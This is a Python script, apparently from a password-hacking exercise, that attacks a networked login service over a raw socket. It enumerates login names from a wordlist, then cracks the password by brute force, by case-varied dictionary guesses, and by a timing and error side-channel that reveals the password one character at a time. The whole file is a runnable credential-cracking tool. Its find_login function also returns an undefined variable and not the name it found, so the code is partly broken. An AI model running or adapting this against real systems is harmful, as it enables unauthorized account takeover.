import argparse
import itertools
import json
import logging
import os
import re
import socket
import string
import time

parser = argparse.ArgumentParser(description='Vulnerability probe')
parser.add_argument('ip', help='Server IP address', type=str)
parser.add_argument('port', help='Port', type=int)
parser.add_argument('mode', help='Mode: bf (brute force), dict')
args = vars(parser.parse_args())
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
cwd = os.getcwd()


class Connection:
    def __init__(self, ip, port, open=False, bsize=1024):
        self.sock = socket.socket()
        self.address = (ip, port)
        self.open = open
        self.bsize = bsize
        self.perf = 0

    def conn(self):
        """
        Connects to the address (ip:port) of the object
        :return: Nothing
        """
        self.sock.connect(self.address)
        self.open = True
        logging.info(f'Connected to {self.address}')


    def disc(self):
        """
        Disconnects from the address (ip:port) of the object
        :return:
        """
        self.sock.close()
        self.open = False
        logging.info(f'Closed connection to {self.address}')

    def send(self, msg):
        """
        Encodes and sends msg to the address (ip:port)
        :param msg: str
        :return: True if successful, False if port is closed
        """
        if self.open:
            # logging.debug(f'Sending {msg} to {self.address}')
            msg = str(msg).encode()
            self.perf_start = time.perf_counter()  # To measure server response delay
            self.sock.send(msg)
            return True
        else:
            logging.error(f'Connection to {self.address} found CLOSED while trying to send {msg}')
            return False

    def receive(self):
        """
        Receives response from server, measures delay against avg delay
        :return: msg if received, an error iif not connected
        """
        if self.open:
            msg = self.sock.recv(self.bsize).decode()
            self.perf_end = time.perf_counter()
            if self.perf == 0:
                self.perf = self.perf_end - self.perf_start
            elif self.perf_end - self.perf_start >= 0.1:  # Trying to catch delay in response. Edit value accordingly
                time.sleep(1)
            else:
                self.perf = (self.perf_end - self.perf_start + self.perf) / 2
            # logging.debug(f'Received {msg} from {self.address}')
            return msg
        else:
            logging.warning(f'Tried to receive from a closed connection to {self.address}')
            return 'Connection closed. Try opening it with con_name.con'


def to_json(login, password=''):
    """
    Converts login and password to a json object
    :param login: str
    :param password: str
    :return: json object
    """
    json_str = {'login': login, 'password': password}
    # logging.debug(f'Converting {json_str} to json')
    return json.dumps(json_str)


def from_json(s):
    """
    Converts a json object to string
    :param s: json object
    :return: str: The value of the 'result' key of the json object
    """
    response = json.loads(s)
    # logging.debug(f'Converted {response} from json')
    return response['result']


def pwd_gen(length, characters='all'):
    """
    Will return all [A-Za-z0-9] + punctuation combinations starting from length
    :param length: The minimum password length to test
       characters: 'a' for a-z, 'A' for A-Z, '0' for 0-9 '.' for punctuation, 'all' for everything
    :return: yields one combination at a time
    """
    char_table = []
    if characters == 'all':
        characters = 'aA0.'
    if 'a' in characters : char_table = list(string.ascii_lowercase)
    if 'A' in characters : char_table += list(string.ascii_uppercase)
    if '0' in characters : char_table += list(string.digits)
    if '.' in characters : char_table += list(string.punctuation)
    logging.info(f'Alphanum generator started with length {length} and mode {characters}')
    for m in range(length, 9):
        for result in itertools.product(char_table, repeat=m):
            yield str(''.join(result))


def dict_pwd_generator(file):
    """
    Iterates over the lines of a file, alternating between upper/lower case
    :param file: Single word per line path/file with passwords
    :return: yields one version at a time
    """
    with open(file, 'r', encoding='utf-8') as f:
        file_lines = f.readlines()
        logging.info(f'Generating combinations from {file}')
        for line in file_lines:
            word = line.rstrip('\n')
            gen = upper_lower(word)
            mutable = len(re.findall(r'[a-zA-Z]', word))
            if mutable == 0:
                versions = 1
            else:
                versions = pow(2, mutable)
            for _n in range(versions):
                yield next(gen)


def upper_lower(text):
    """
    Alternates between upper and lower case for each letter, all combinations
    :param text: The text
    :return: yields one combination at a time
    """
    logging.info(f'Alternating between UPPER and lower case for {text}')
    words = map(''.join, itertools.product(*zip(text, text.upper())))
    for word in words:
        yield word


def try_pwds(connection, login=None, length=False, file=False, success='Connection success!'):
    """
    Tries passwords until it receives the success message
    :param connection: Connection class, connected
    :param login: login name if known, default: None
    :param length: minimum password length if known, default: False
    :param file: file with known passwords, default: False
    :param success: the success message, default: 'Connection success!'
    :return:
    """
    if length is not False:
        logging.info(f'Brute Force: {connection.address}, pwd length: {length}')
        gen = pwd_gen(length)
    elif file is not False:
        logging.info(f'Dict attack: {connection.address} with {file}')
        gen = dict_pwd_generator(file)
    elif login is not None:
        logging.info(f'Brute Force: {connection.address} with login {login}')
        gen = pwd_gen(1)
    response = ''
    candidate = [' ']
    while response != success:
        candidate[len(candidate) - 1] = next(gen)
        password = ''.join(candidate)
        tcounter = time.perf_counter()
        connection.send(to_json(login, password=password))
        response = from_json(connection.receive())
        rcounter = time.perf_counter()
        if response == 'Exception happened during login' or (rcounter - tcounter) > 0.9:
            logging.info(f'Password partial match {"".join(candidate)}')
            candidate.append(' ')
            gen = pwd_gen(1)
    password = ''.join(candidate)
    logging.info(f'Found password {password}')
    return password


def find_login(connection, path_file=cwd + '\\hacking\\logins.txt', resp='Wrong password!'):
    """
    Tries different logins from path_file
    :param connection: Connection instance, open
    :param path_file: The path/file to a library of known login names, defaults to cwd + '\\hacking\\logins.txt'
    :param resp: Expected successful response, default: 'Wrong password!'
    :return: str: login name
    """
    logging.info(f'Trying logins for {connection.address} from {path_file} ')
    with open(path_file, 'r') as f:
        for line in f.readlines():
            l_name = line.rstrip('\n')
            connection.send(to_json(login=l_name))
            response = from_json(connection.receive())
            if response == resp:
                logging.info(f'Found login for {connection.address}: {l_name}')
                break
    return login


con01 = Connection(args['ip'], args['port'])
con01.conn()
login = find_login(con01)
print(to_json(login=login, password=try_pwds(con01, length=False, login=login)))
con01.disc()
